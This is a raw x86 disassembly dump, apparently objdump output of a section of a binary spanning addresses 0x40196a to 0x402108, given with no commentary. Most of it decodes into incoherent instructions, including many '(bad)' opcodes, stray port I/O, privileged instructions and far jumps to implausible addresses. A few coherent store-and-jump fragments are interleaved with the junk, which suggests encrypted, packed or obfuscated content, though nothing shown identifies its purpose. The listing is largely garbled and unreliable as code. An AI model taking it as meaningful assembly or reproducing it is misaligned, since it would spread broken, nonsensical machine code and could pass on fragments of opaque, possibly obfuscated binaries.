  40196a:	jbe    0x40190d
  40196c:	stos   DWORD PTR es:[edi],eax
  40196d:	addr16 test eax,0x3cb9c490
  401973:	test   al,0x13
  401975:	mov    ds:0x213e7289,eax
  40197a:	adc    eax,0xbf38f016
  40197f:	sbb    BYTE PTR [edx-0x76],0xdf
  401983:	sub    cl,ch
  401985:	sbb    al,0x73
  401987:	loop   0x4019cd
  401989:	cld    
  40198a:	mov    dl,0x33
  40198c:	sbb    ebp,DWORD PTR [esi+eiz*8-0x726ba9b4]
  401993:	xor    esp,DWORD PTR [ecx]
  401995:	enter  0xadb3,0xcf
  401999:	jecxz  0x401933
  40199b:	dec    edi
  40199c:	das    
  40199d:	and    cl,dl
  40199f:	pusha  
  4019a0:	ds std 
  4019a2:	mov    esp,0x3ccf048c
  4019a7:	add    DWORD PTR [ebx-0xb6a8a0c],edi
  4019ad:	outs   dx,DWORD PTR ds:[esi]
  4019ae:	loope  0x40194d
  4019b0:	test   al,0x4e
  4019b2:	add    esp,DWORD PTR [ebp+0x1b]
  4019b5:	mov    eax,0x1a51297a
  4019ba:	enterw 0xeea0,0xb
  4019bf:	dec    ecx
  4019c0:	xor    bl,bl
  4019c2:	push   ebp
  4019c3:	and    BYTE PTR [eax+0x13],bl
  4019c6:	dec    esi
  4019c7:	cmp    ebp,DWORD PTR [edx-0x14724955]
  4019cd:	call   0x32e2b72f
  4019d2:	jnp    0x401a2f
  4019d4:	(bad)  
  4019d5:	call   FWORD PTR [ebp+0x7]
  4019d8:	(bad)  
  4019da:	xor    al,0x9
  4019dc:	rcl    BYTE PTR [ebx-0x5b],1
  4019df:	add    ebx,DWORD PTR [ebx+0x79]
  4019e2:	mov    ecx,0x58f199b3
  4019e7:	test   esi,0x342f1184
  4019ed:	icebp  
  4019ee:	ja     0x401a4e
  4019f0:	gs pop esi
  4019f2:	pop    ss
  4019f3:	fwait
  4019f4:	and    BYTE PTR [edi+ecx*8-0x1d],cl
  4019f8:	punpckhwd mm6,mm1
  4019fb:	adc    edx,DWORD PTR [esi]
  4019fd:	adc    ebp,esp
  4019ff:	dec    dl
  401a01:	cmc    
  401a02:	popf   
  401a03:	xor    DWORD PTR [ecx+ecx*8-0x5c5d829b],eax
  401a0a:	push   0x72b7f095
  401a0f:	mov    ah,0xaa
  401a11:	fsubr  DWORD PTR [ecx+0xb9a7b2f]
  401a17:	aaa    
  401a18:	pop    es
  401a19:	cmp    BYTE PTR ds:0xdc2abb12,bh
  401a1f:	sub    DWORD PTR [eax+0x6bd21861],esp
  401a25:	sub    eax,0xd8946b48
  401a2a:	and    ebp,ebp
  401a2c:	(bad)  
  401a2d:	test   eax,0xa07124eb
  401a32:	mov    cl,0xbc
  401a34:	inc    ebp
  401a35:	push   es
  401a36:	sbb    al,0x6c
  401a38:	aas    
  401a39:	inc    eax
  401a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a3b:	mov    DWORD PTR [ebp+0x19],eax
  401a3e:	(bad)  
  401a3f:	fldenv [ecx]
  401a41:	push   ebx
  401a42:	push   ecx
  401a43:	lods   eax,DWORD PTR ds:[esi]
  401a44:	push   ebp
  401a45:	call   0xce603960
  401a4a:	adc    ah,BYTE PTR [eax]
  401a4c:	xchg   esp,eax
  401a4d:	mov    cs,WORD PTR [ecx+0x57]
  401a50:	adc    ebp,DWORD PTR [ecx+0x63]
  401a53:	sub    ebx,DWORD PTR [eax+ecx*8]
  401a56:	stos   BYTE PTR es:[edi],al
  401a57:	cmp    esp,DWORD PTR [ecx]
  401a59:	xchg   BYTE PTR ds:0xcda01486,dh
  401a5f:	mov    ebp,0x731aeb03
  401a64:	sbb    BYTE PTR [edi-0x1a],0x9d
  401a68:	mov    dh,BYTE PTR [esp+edi*2+0x5d]
  401a6c:	sub    BYTE PTR [ebx],cl
  401a6e:	xor    ecx,eax
  401a70:	stos   BYTE PTR es:[edi],al
  401a71:	cdq    
  401a72:	dec    edx
  401a73:	mov    cl,BYTE PTR [esi+0x5d89528f]
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	pushf  
  401a8c:	jle    0x401a1f
  401a8e:	sbb    cl,BYTE PTR [esi]
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401ae3
  401a98:	sub    eax,0x33
  401a9b:	inc    ebx
  401a9c:	(bad)  
  401a9d:	jo     0x401a5b
  401a9f:	or     DWORD PTR [ebx+0x1e],ebx
  401aa2:	xlat   BYTE PTR ds:[ebx]
  401aa3:	mov    al,ds:0xb515f357
  401aa8:	sub    BYTE PTR [ecx+0x58],cl
  401aab:	shl    BYTE PTR [edi],cl
  401aad:	iret   
  401aae:	jmp    0x401af7
  401ab0:	cmp    eax,0x67220abe
  401ab5:	add    BYTE PTR [ecx+0x69],cl
  401ab8:	inc    ebp
  401ab9:	or     esi,ebp
  401abb:	pop    eax
  401abc:	mov    edx,0xb0b5402b
  401ac1:	jbe    0x401ae9
  401ac3:	es out dx,al
  401ac5:	outs   dx,DWORD PTR ds:[esi]
  401ac6:	lods   al,BYTE PTR ds:[esi]
  401ac7:	int3   
  401ac8:	fcomp  DWORD PTR [edx]
  401aca:	ins    BYTE PTR es:[edi],dx
  401acb:	(bad)  
  401acc:	mov    ebp,0x5bf702c8
  401ad1:	or     ebx,DWORD PTR [eax]
  401ad3:	mov    ebx,DWORD PTR [eax-0x4e]
  401ad6:	repnz call 0x421f:0xfde935a1
  401ade:	call   0xc109590a
  401ae3:	sbb    BYTE PTR [eax+0x45],ch
  401ae6:	enter  0x31fc,0x39
  401aea:	dec    ebp
  401aeb:	sub    bl,bh
  401aed:	dec    edx
  401aee:	xchg   edi,eax
  401aef:	mov    eax,0x49b495e3
  401af4:	sbb    cl,BYTE PTR [esi+ebp*2]
  401af7:	mov    cl,0x35
  401af9:	call   DWORD PTR [edi]
  401afb:	in     eax,dx
  401afc:	or     edi,DWORD PTR [edx]
  401afe:	mov    dh,0xa4
  401b00:	nop
  401b01:	call   0xe8bc:0x752b4bb1
  401b08:	outs   dx,DWORD PTR ds:[esi]
  401b09:	pop    ecx
  401b0a:	adc    ecx,eax
  401b0c:	pop    esi
  401b0d:	mov    esi,0xcbdc403
  401b12:	ret    0x6b6b
  401b15:	mov    bl,0x25
  401b17:	out    dx,al
  401b18:	cwde   
  401b19:	pop    ecx
  401b1a:	mov    edx,DWORD PTR [ebx]
  401b1c:	out    dx,al
  401b1d:	dec    esi
  401b1e:	test   BYTE PTR [eax+edx*8+0xa],dl
  401b22:	inc    eax
  401b23:	mov    eax,ds:0x34a03dc6
  401b28:	shr    BYTE PTR [eax+ebp*2+0x11f7a308],1
  401b2f:	mov    cl,0xc
  401b31:	pop    eax
  401b32:	fsub   st(5),st
  401b34:	shl    DWORD PTR [esi-0x3a],1
  401b37:	jbe    0x401b08
  401b39:	inc    esp
  401b3a:	jge    0x401ae6
  401b3c:	xchg   edx,eax
  401b3d:	outs   dx,BYTE PTR ds:[esi]
  401b3e:	(bad)  
  401b3f:	int3   
  401b40:	repnz nop
  401b42:	push   edi
  401b43:	or     al,0x8a
  401b45:	into   
  401b46:	mov    cl,0x22
  401b48:	dec    ah
  401b4a:	shl    DWORD PTR [ecx],0x1
  401b4d:	das    
  401b4e:	mov    cl,ah
  401b50:	mov    al,ds:0xe35366cc
  401b55:	jp     0x401bb4
  401b57:	push   cs
  401b58:	shr    DWORD PTR [eax+0x6e],1
  401b5b:	lods   al,BYTE PTR ds:[esi]
  401b5c:	es stos BYTE PTR es:[edi],al
  401b5e:	paddsw mm7,QWORD PTR [ecx-0xe99514a]
  401b65:	rcr    DWORD PTR [edx+eiz*8+0x61],1
  401b69:	xchg   ebp,eax
  401b6a:	pusha  
  401b6b:	aaa    
  401b6c:	inc    ecx
  401b6d:	mov    dh,0xb9
  401b6f:	jp     0x401af4
  401b71:	icebp  
  401b72:	cmp    BYTE PTR [edx+0x1b],0xcf
  401b76:	std    
  401b77:	leave  
  401b78:	shl    BYTE PTR [ebp+0x4c],0x80
  401b7c:	cmp    al,0x11
  401b7e:	out    dx,eax
  401b7f:	fisttp QWORD PTR [ecx-0x3]
  401b82:	fwait
  401b83:	mov    al,0x6c
  401b85:	loopne 0x401bd9
  401b87:	(bad)  
  401b89:	cmp    al,0x1c
  401b8b:	mov    al,ds:0x99b9478c
  401b90:	shl    BYTE PTR [ebx],0x14
  401b93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b95:	in     eax,dx
  401b96:	clc    
  401b97:	je     0x401b84
  401b99:	sbb    BYTE PTR [bp+si+0x17],0x18
  401b9e:	js     0x401b38
  401ba0:	out    dx,eax
  401ba1:	mov    ecx,0x61051ee7
  401ba6:	push   esp
  401ba7:	sbb    al,0x3f
  401ba9:	ja     0x401b54
  401bab:	gs lahf 
  401bad:	and    bh,BYTE PTR [esi-0x15]
  401bb0:	sbb    ch,BYTE PTR [ebp+0x7f]
  401bb3:	mov    ecx,0xd44b4951
  401bb8:	jb     0x401bcc
  401bba:	push   ebp
  401bbb:	jbe    0x401b61
  401bbd:	mov    ebx,fs
  401bbf:	out    0x92,eax
  401bc1:	jg     0x401c37
  401bc3:	pop    ss
  401bc4:	push   esp
  401bc5:	clc    
  401bc6:	int3   
  401bc7:	(bad)  
  401bc8:	iret   
  401bc9:	repz fimul DWORD PTR [ecx+ebx*4]
  401bcd:	inc    esi
  401bce:	cwde   
  401bcf:	push   edx
  401bd0:	pop    ss
  401bd1:	lods   al,BYTE PTR ds:[esi]
  401bd2:	add    DWORD PTR [esi],0xc425b6c
  401bd8:	jmp    0x7b67:0x6b8c09d3
  401bdf:	or     bl,BYTE PTR [ebp+0x4a]
  401be2:	xchg   ecx,eax
  401be3:	mov    eax,ds:0xb2a671e1
  401be8:	push   ebp
  401be9:	push   esi
  401bea:	push   ecx
  401beb:	pop    eax
  401bec:	xor    al,0xca
  401bee:	fwait
  401bef:	sbb    esp,DWORD PTR [ebx]
  401bf1:	shl    ah,0x58
  401bf4:	adc    dh,BYTE PTR [edx]
  401bf6:	mov    al,0xf4
  401bf8:	(bad)  
  401bf9:	sti    
  401bfa:	push   ecx
  401bfb:	neg    BYTE PTR [edi+0x5ec35587]
  401c01:	leave  
  401c02:	stos   BYTE PTR es:[edi],al
  401c03:	xchg   esi,eax
  401c04:	ret    
  401c05:	ret    
  401c06:	(bad)  
  401c07:	hlt    
  401c08:	xor    eax,0xf7374dcb
  401c0d:	xor    BYTE PTR [edx-0x55a9e7b5],al
  401c13:	or     esi,edx
  401c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c16:	es cmc 
  401c18:	sub    BYTE PTR ds:0xb0458bdb,bh
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	imul   ecx,DWORD PTR [ebx+0x798ae5a0],0x7ffa7e7e
  401c4a:	jle    0x401cca
  401c4c:	fwait
  401c4d:	sbb    DWORD PTR [ebp+0xaab918c],esp
  401c53:	or     eax,DWORD PTR [esi+0x52]
  401c56:	cmp    DWORD PTR [edi+eiz*8],esp
  401c59:	push   esi
  401c5a:	rcl    BYTE PTR [eax],cl
  401c5c:	xor    eax,0x539aa39c
  401c61:	sbb    al,0xb8
  401c63:	cli    
  401c64:	mov    DWORD PTR [eax-0x25],0xcc640de9
  401c6b:	aas    
  401c6c:	mov    ds:0x7bc5f19f,eax
  401c71:	mov    ds:0x4b31c0b8,eax
  401c76:	xchg   ebp,eax
  401c77:	loop   0x401ce0
  401c79:	push   ebx
  401c7a:	icebp  
  401c7b:	and    bh,cl
  401c7d:	pop    ss
  401c7e:	frstor [esi]
  401c80:	xlat   BYTE PTR ds:[ebx]
  401c81:	cld    
  401c82:	inc    ebp
  401c83:	loope  0x401c9d
  401c85:	sbb    eax,0x7342d6e2
  401c8a:	test   BYTE PTR [ebp-0x4024864f],0x20
  401c91:	(bad)  
  401c92:	push   edx
  401c93:	add    bh,BYTE PTR [ecx+0x2a850ea5]
  401c99:	add    eax,0x429d4f0c
  401c9e:	sbb    dh,BYTE PTR [ebp*2-0x5d6c15dc]
  401ca5:	and    al,bl
  401ca7:	out    0x9a,eax
  401ca9:	je     0x401c86
  401cab:	aam    0xad
  401cad:	sub    al,0xa
  401caf:	imul   esp,DWORD PTR [esi],0x207720cd
  401cb5:	mov    bl,0xa3
  401cb7:	ins    DWORD PTR es:[edi],dx
  401cb8:	jg     0x401cb7
  401cba:	imul   BYTE PTR [eax-0x4b]
  401cbd:	daa    
  401cbe:	(bad)  
  401cbf:	pushf  
  401cc0:	sti    
  401cc1:	test   DWORD PTR [esi-0x61],eax
  401cc4:	push   esi
  401cc5:	jbe    0x401cb9
  401cc7:	bnd jb 0x401ce8
  401cca:	pop    es
  401ccb:	fsubr  QWORD PTR [ebp-0x3ab09580]
  401cd1:	adc    esi,DWORD PTR [ebp-0x46a395a3]
  401cd7:	pop    ecx
  401cd8:	xchg   esi,eax
  401cd9:	mov    esp,0xccdbe44c
  401cde:	add    DWORD PTR [edi],ebx
  401ce0:	adc    al,0x50
  401ce2:	cmp    esp,esp
  401ce4:	mov    edx,0xa4d79fc3
  401ce9:	xor    eax,0xd013ab7
  401cee:	(bad)  
  401cf0:	or     eax,0x55daf60e
  401cf5:	sbb    eax,0x39626e7f
  401cfa:	in     eax,dx
  401cfb:	jbe    0x401d50
  401cfd:	xchg   esp,eax
  401cfe:	rcr    BYTE PTR [esi],0xd9
  401d01:	retf   0x3256
  401d04:	xlat   BYTE PTR ds:[ebx]
  401d06:	dec    ebx
  401d07:	push   cs
  401d08:	arpl   WORD PTR [eax-0x17],bp
  401d0b:	or     DWORD PTR [eax-0x3c0cf19e],edi
  401d11:	add    esi,ecx
  401d13:	popa   
  401d14:	mov    cl,BYTE PTR [esi-0x5c]
  401d17:	mov    bl,BYTE PTR [eax]
  401d19:	xchg   ebp,eax
  401d1a:	lahf   
  401d1b:	fbld   TBYTE PTR [edi]
  401d1d:	loope  0x401d6c
  401d1f:	fmul   DWORD PTR [ecx+0x3af16444]
  401d25:	cdq    
  401d26:	jl     0x401ce0
  401d28:	push   esp
  401d29:	jecxz  0x401d57
  401d2b:	gs inc ecx
  401d2d:	mov    al,0xc3
  401d2f:	jno    0x401d95
  401d31:	and    eax,DWORD PTR [edx+0x4d]
  401d34:	push   ebx
  401d35:	cdq    
  401d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d37:	or     al,ah
  401d39:	pop    edx
  401d3a:	jb     0x401d92
  401d3c:	fs jmp 0x7994b263
  401d42:	retf   0x790b
  401d45:	pop    ebp
  401d46:	in     al,dx
  401d47:	in     al,0xd2
  401d49:	imul   DWORD PTR [edi+0x1faab395]
  401d4f:	sub    eax,0x1485f84e
  401d54:	mov    ds:0xa0f35fc2,eax
  401d59:	adc    DWORD PTR [esi+0x7a],ecx
  401d5c:	pop    edx
  401d5d:	and    ebp,DWORD PTR [ebx+0x48b307d5]
  401d63:	and    DWORD PTR [ebp+0x434b3e1c],eax
  401d69:	mov    eax,ds:0xcd2a1dc6
  401d6e:	fdivr  st(4),st
  401d70:	in     al,dx
  401d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d72:	jne    0x401d7e
  401d74:	rcl    DWORD PTR [eax+0x557734c1],1
  401d7a:	sub    DWORD PTR cs:[ebp-0x19],ebp
  401d7e:	push   0x4f
  401d80:	add    ah,BYTE PTR [ebx]
  401d82:	cmp    eax,0x9f745b91
  401d87:	call   FWORD PTR [edi-0x52a41efc]
  401d8d:	add    bl,BYTE PTR [edi]
  401d8f:	test   al,0xeb
  401d91:	nop
  401d92:	cmp    al,BYTE PTR [esi]
  401d94:	pop    ss
  401d95:	jp     0x401d74
  401d97:	mov    edx,DWORD PTR [ecx-0x3d]
  401d9a:	or     eax,DWORD PTR [edi]
  401d9c:	pop    edi
  401d9d:	push   ebx
  401d9e:	mov    dl,bl
  401da0:	adc    DWORD PTR [ebp-0x37],ecx
  401da3:	dec    ebp
  401da4:	daa    
  401da5:	jmp    0xa110:0x911e3d54
  401dac:	leave  
  401dad:	push   es
  401dae:	ds mov esi,0x58d967b4
  401db4:	in     eax,dx
  401db5:	stos   BYTE PTR es:[edi],al
  401db6:	mov    bl,0x8c
  401db8:	jns    0x401de6
  401dba:	xchg   ebx,eax
  401dbb:	sub    BYTE PTR [ebx],ah
  401dbd:	push   es
  401dbe:	es pop ebp
  401dc0:	fwait
  401dc1:	cwde   
  401dc2:	(bad)  
  401dc3:	les    edi,FWORD PTR ds:0x81070034
  401dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dca:	iret   
  401dcb:	mov    dh,0x8e
  401dcd:	iret   
  401dce:	adc    ch,dl
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x72c448c8],ebp
  401e0d:	ficom  WORD PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dab
  401e17:	sbb    edi,DWORD PTR [eax-0x70]
  401e1a:	jns    0x401e61
  401e1c:	frstor [ecx+0x565fed48]
  401e22:	inc    ebx
  401e23:	sub    ch,ch
  401e25:	into   
  401e26:	mov    WORD PTR [edi-0x6ef1d666],fs
  401e2c:	push   cs
  401e2d:	sub    al,0x82
  401e2f:	sub    eax,DWORD PTR [ecx+ecx*1-0x232e8ba4]
  401e36:	xchg   ebp,eax
  401e37:	mov    dl,0x2
  401e39:	sti    
  401e3a:	xor    DWORD PTR [ebp-0x669a8c91],eax
  401e40:	ficomp WORD PTR [ebx+ebp*1+0xe]
  401e44:	adc    BYTE PTR [eax-0x6b],ch
  401e47:	pop    edi
  401e48:	into   
  401e49:	dec    DWORD PTR [eax-0x296ccf7e]
  401e4f:	push   ss
  401e50:	cmp    DWORD PTR [ecx],ecx
  401e52:	in     eax,0xa6
  401e54:	scas   eax,DWORD PTR es:[edi]
  401e55:	popf   
  401e56:	jl     0x401e5b
  401e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e59:	test   al,0xa2
  401e5b:	inc    esp
  401e5c:	aam    0x70
  401e5e:	pushf  
  401e5f:	es gs mov ebx,0x197728bf
  401e66:	mov    BYTE PTR [esi],cl
  401e68:	inc    esi
  401e69:	inc    ecx
  401e6a:	in     al,0xf6
  401e6c:	xor    eax,0xec35abc0
  401e71:	loopne 0x401eed
  401e73:	ficomp DWORD PTR [ebx+0x66]
  401e76:	les    ebp,FWORD PTR [ebx+eiz*2+0x74]
  401e7a:	mov    bl,0xd8
  401e7c:	in     eax,0xfc
  401e7e:	test   al,0xfa
  401e80:	lock daa 
  401e82:	test   al,0xf7
  401e84:	das    
  401e85:	mov    ch,0x13
  401e87:	lahf   
  401e88:	adc    eax,0x22098f31
  401e8d:	in     al,0x39
  401e8f:	mov    ecx,0x18a19002
  401e94:	sub    al,0x94
  401e96:	and    ecx,eax
  401e98:	cwde   
  401e99:	lods   eax,DWORD PTR ds:[esi]
  401e9a:	cdq    
  401e9b:	ret    
  401e9c:	cmp    DWORD PTR [esi],ebx
  401e9e:	out    dx,eax
  401e9f:	leave  
  401ea0:	rol    ebp,1
  401ea2:	sub    eax,0xd7caad6
  401ea7:	rcl    BYTE PTR ds:0x838e6e8d,cl
  401ead:	ret    0x32a2
  401eb0:	mov    BYTE PTR [edx-0x5de12a12],cl
  401eb6:	std    
  401eb7:	movaps xmm7,xmm2
  401eba:	add    DWORD PTR [edi],ebp
  401ebc:	retf   0xd071
  401ebf:	or     eax,0x2708bae1
  401ec4:	xor    BYTE PTR [ebp+0x6a],ch
  401ec7:	sbb    al,0x92
  401ec9:	enter  0x880b,0x56
  401ecd:	pop    edi
  401ece:	in     eax,dx
  401ecf:	xor    ebx,DWORD PTR [eax+0x22ee4960]
  401ed5:	mov    edi,0xd7d7ab26
  401eda:	mov    eax,ds:0x76523e05
  401edf:	sbb    ebp,edx
  401ee1:	in     eax,dx
  401ee2:	mov    edi,0x720a63cd
  401ee7:	adc    eax,0x7898571c
  401eec:	and    eax,0x2bacab27
  401ef1:	pop    esi
  401ef2:	push   eax
  401ef3:	stc    
  401ef4:	nop
  401ef5:	inc    ecx
  401ef6:	(bad)  
  401ef7:	jg     0x401ea6
  401ef9:	pop    ebp
  401efa:	jmp    0x2fb22309
  401eff:	fs and al,0x79
  401f02:	in     al,dx
  401f03:	jbe    0x401f3d
  401f05:	jmp    FWORD PTR [ebx]
  401f07:	jp     0x401f11
  401f09:	scas   eax,DWORD PTR es:[edi]
  401f0a:	or     BYTE PTR [ebp-0x7b],cl
  401f0d:	rcl    esi,1
  401f0f:	add    eax,0xd2d6d24
  401f14:	lahf   
  401f15:	or     eax,0x7b8673ac
  401f1a:	in     eax,0x8d
  401f1c:	mov    bh,0x11
  401f1e:	outs   dx,DWORD PTR ds:[esi]
  401f1f:	mov    bh,0xa9
  401f21:	bound  ebx,QWORD PTR [esi+0x65]
  401f24:	adc    eax,0x503d38f4
  401f29:	sbb    ebx,DWORD PTR [edx+0x330508d4]
  401f2f:	jns    0x401f4f
  401f31:	xor    eax,0x2bfd1337
  401f36:	rcl    DWORD PTR [esi-0x3c],0xae
  401f3a:	push   ds
  401f3b:	shl    DWORD PTR [edi-0x2dae3e7b],1
  401f41:	(bad)  
  401f42:	hlt    
  401f43:	in     al,0x5d
  401f45:	loopne 0x401f53
  401f47:	rol    DWORD PTR [edi],0x75
  401f4a:	inc    edi
  401f4b:	or     DWORD PTR [ebp+0x1f1af298],esi
  401f51:	xchg   ebx,eax
  401f52:	jp     0x401f61
  401f54:	loope  0x401f76
  401f56:	cld    
  401f57:	and    al,BYTE PTR [eax+0x38beb54b]
  401f5d:	mov    ds,WORD PTR [esi+0x1f]
  401f60:	rcl    DWORD PTR [edx-0x22c3ebf1],0x90
  401f67:	mov    ah,0xf7
  401f69:	xchg   esp,eax
  401f6a:	sbb    ebp,0xffffffbb
  401f6d:	dec    DWORD PTR [edx]
  401f6f:	lods   al,BYTE PTR ds:[esi]
  401f70:	xor    ebx,DWORD PTR [ecx+0x9c510b6]
  401f76:	jmp    0x401f2d
  401f78:	sbb    eax,0x9d5be5ce
  401f7d:	cmp    DWORD PTR [ebx+0x22],eax
  401f80:	(bad)  
  401f81:	adc    DWORD PTR [ebx],ebp
  401f83:	(bad)  
  401f84:	popf   
  401f85:	dec    ebp
  401f86:	fdiv   st,st(0)
  401f88:	(bad)  
  401f89:	push   ds
  401f8a:	idiv   DWORD PTR [ebp+0x19af8b52]
  401f90:	fwait
  401f91:	ins    DWORD PTR es:[edi],dx
  401f92:	jle    0x401f3a
  401f94:	jmp    0x401fa6
  401f96:	out    0x1c,eax
  401f98:	jne    0x401f3c
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x2b599088
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f84
  401fcc:	pop    ecx
  401fcd:	ret    
  401fce:	adc    bh,BYTE PTR [eax]
  401fd0:	imul   DWORD PTR [ebp+edi*4+0x556ae951]
  401fd7:	repz inc ebp
  401fd9:	aad    0xe8
  401fdb:	adc    edx,edx
  401fdd:	fstp   DWORD PTR [edi-0x1d]
  401fe0:	fs jmp 0x402009
  401fe3:	ins    DWORD PTR es:[edi],dx
  401fe4:	sbb    al,0x13
  401fe6:	clc    
  401fe7:	mov    al,ds:0x4472964f
  401fec:	or     al,0x44
  401fee:	sub    cl,BYTE PTR [esp+edx*1+0x5c]
  401ff2:	ins    BYTE PTR es:[edi],dx
  401ff3:	push   eax
  401ff4:	mov    esp,0xe300e6f3
  401ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ffa:	(bad)
  401ffd:	add    bl,0x3
  402000:	pushf  
  402001:	fistp  DWORD PTR [ebx]
  402004:	mov    WORD PTR [ebx-0xbbd16f7],ds
  40200a:	and    DWORD PTR [eax+0x28],0x48830d83
  402011:	call   0xeb55731b
  402016:	test   eax,0x79a14ef1
  40201b:	mov    al,ds:0x58d89e2f
  402020:	sub    DWORD PTR ds:0x5147cc40,0xffffffd6
  402027:	mov    ss,WORD PTR [ebx]
  402029:	inc    esi
  40202a:	inc    ebp
  40202b:	mov    eax,ds:0x84ecfd14
  402030:	stc    
  402031:	popf   
  402032:	sub    BYTE PTR [edx+0x3d97fb06],cl
  402038:	cwde   
  402039:	mov    WORD PTR [edx+0x54],cs
  40203c:	xor    BYTE PTR [edi-0x5f455e8d],ch
  402042:	mov    ah,0x58
  402044:	out    0x3b,al
  402046:	jmp    0xe6ccead8
  40204b:	stc    
  40204c:	retf   0x6089
  40204f:	std    
  402050:	imul   eax,DWORD PTR [edx-0x64c41f75],0xc79d3e79
  40205a:	cmp    BYTE PTR [ebx-0x3a],dl
  40205d:	add    eax,0x8273b24
  402062:	leave  
  402063:	push   ebx
  402064:	pop    es
  402065:	mov    DWORD PTR [edi+0x786c98e9],ebx
  40206b:	lds    edx,FWORD PTR [edi+0x6cb76641]
  402071:	xchg   DWORD PTR [edi],esp
  402073:	xor    eax,0x6157e8c2
  402078:	pop    edi
  402079:	fnstcw WORD PTR [edx-0x718889db]
  40207f:	lods   eax,DWORD PTR ds:[esi]
  402080:	ret    
  402081:	ja     0x402035
  402083:	inc    ebp
  402084:	xchg   ecx,eax
  402085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402086:	mov    al,ds:0x6b0134a1
  40208b:	lods   eax,DWORD PTR ds:[esi]
  40208c:	ins    DWORD PTR es:[edi],dx
  40208d:	hlt    
  40208e:	cld    
  40208f:	(bad)
  402093:	or     DWORD PTR [edx],edi
  402095:	mov    esp,0x5b12f8ab
  40209a:	add    DWORD PTR [ebx-0x4e5c1895],ebx
  4020a0:	and    eax,0x50bf8cef
  4020a5:	push   edi
  4020a6:	rcl    esp,1
  4020a8:	pop    ebx
  4020a9:	(bad)  
  4020ab:	xor    BYTE PTR [ecx-0x4d],ch
  4020ae:	daa    
  4020af:	dec    edi
  4020b0:	push   esp
  4020b1:	cli    
  4020b2:	mov    ch,0x4b
  4020b4:	fs enter 0xcbe0,0x8a
  4020b9:	out    0xb1,al
  4020bb:	ds push edi
  4020bd:	add    cl,BYTE PTR [ebp-0x30]
  4020c0:	xchg   DWORD PTR [ebx],ecx
  4020c2:	jg     0x4020d7
  4020c4:	sar    BYTE PTR [esi],cl
  4020c6:	stc    
  4020c7:	mov    bl,BYTE PTR [ebx+0x3b474c46]
  4020cd:	dec    esi
  4020ce:	retf   
  4020cf:	mov    ch,0xfe
  4020d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d2:	sahf   
  4020d3:	dec    eax
  4020d4:	out    0xd5,al
  4020d6:	sub    DWORD PTR [edx-0x29e855f9],edx
  4020dc:	jl     0x402105
  4020de:	and    BYTE PTR [eax],dh
  4020e0:	jbe    0x40213f
  4020e2:	push   es
  4020e3:	nop
  4020e4:	pop    ecx
  4020e5:	and    al,0x67
  4020e7:	xlat   BYTE PTR ds:[ebx]
  4020e8:	ins    BYTE PTR es:[edi],dx
  4020e9:	xlat   BYTE PTR ds:[ebx]
  4020ea:	retf   
  4020eb:	xchg   BYTE PTR [eax],al
  4020ed:	push   ebx
  4020ee:	cld    
  4020ef:	imul   ecx,DWORD PTR [ebx+0x6df96a87],0x24
  4020f6:	les    edx,FWORD PTR [esi]
  4020f8:	inc    ebx
  4020f9:	mov    ecx,0x9cda4510
  4020fe:	adc    al,0xdc
  402100:	jb     0x40211e
  402102:	cmp    edi,DWORD PTR [edi-0x1e]
  402105:	sub    BYTE PTR [edi],ch
  402107:	leave  
  402108:	fist   WORD PTR [edi]
